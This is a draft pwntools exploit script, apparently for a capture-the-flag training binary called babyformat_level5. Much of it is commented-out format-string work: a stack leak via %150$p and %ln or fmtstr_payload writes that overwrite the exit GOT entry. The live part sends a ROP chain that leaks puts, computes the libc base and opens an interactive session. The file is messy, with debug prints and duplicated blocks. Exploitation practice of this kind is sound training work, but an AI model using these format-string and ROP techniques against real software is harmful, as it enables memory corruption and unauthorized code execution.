#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babyformat_level5
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level5')
context.terminal = ["tmux", "splitw", "-h"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

# exploit = f"%150$p"
# io.sendline(exploit)
# io.recvuntil(b"Your input is:")
# io.recvline()
# leaked_rbp = io.recvline(keepends=False)
# print(f"leaked rbp : {leaked_rbp}")
# rbp_main = int(leaked_rbp, 16)
# rbp_func = rbp_main - 80 
# print(f"leaked rbp_func : {hex(rbp_func)}")
# leaked_ret = rbp_func + 8
# rip_func = leaked_ret
# print(f"leaked rip_func : {hex(leaked_ret)}")

# payload = b"%04199028d%20$lnAAAAAAA" + p64(0x404060) #exit got -> func
# payload = b"%04199028d%24$lnAAAAAAA" + p64(0x404060) #exit got -> func
# exit_loc=0x404060
# writes = {exit_loc:4199069}
# payload = b'a'*7+fmtstr_payload(20, writes, numbwritten=41)
# payload =fmtstr_payload(20, writes, numbwritten=41)
# print(payload)
# io.send(payload)

# io.recvuntil(b"Your input is:")

# def send_fmt_payload(payload):
#      print(repr(payload))
#      io.sendline(payload)
#      return io.recv()

# f.write(0x404060, 0x40129d)
# f.execute_writes()

# exploit = f"%150$p"
# io.sendline(exploit)
# io.recvuntil(b"Your input is:")
# io.recvline()
# leaked_rbp = io.recvline(keepends=False)
# print(f"leaked rbp : {leaked_rbp}")
# rbp_main = int(leaked_rbp, 16)
# rbp_func = rbp_main - 80 # 80 = diff of rbp main and func
# print(f"leaked rbp_func : {hex(rbp_func)}")
# leaked_ret = rbp_func + 8
# rip_func = leaked_ret
# print(f"leaked rip_func : {hex(leaked_ret)}")
def leak_libc():
    pop_rdi=p64(0x4015d3)
    got_put=p64(0x404020)
    plt_put=p64(0x4010e0)
    chain = pop_rdi + got_put + plt_put
    return chain

    
exploit = leak_libc() + p64(0x4014c4) 
print('here')
io.sendline(exploit)
print('here')
leaked_bytes = io.recvline(keepends=False)
leaked_bytes = io.recvline(keepends=False)
leaked_puts = u64(leaked_bytes.ljust(8, b"\0"))
print(f"leaked puts: 0x{leaked_puts:x}")
offset_puts = 0x84420
base_libc = leaked_puts - offset_puts

print(f"base of libc: 0x{base_libc:x}")

io.interactive()

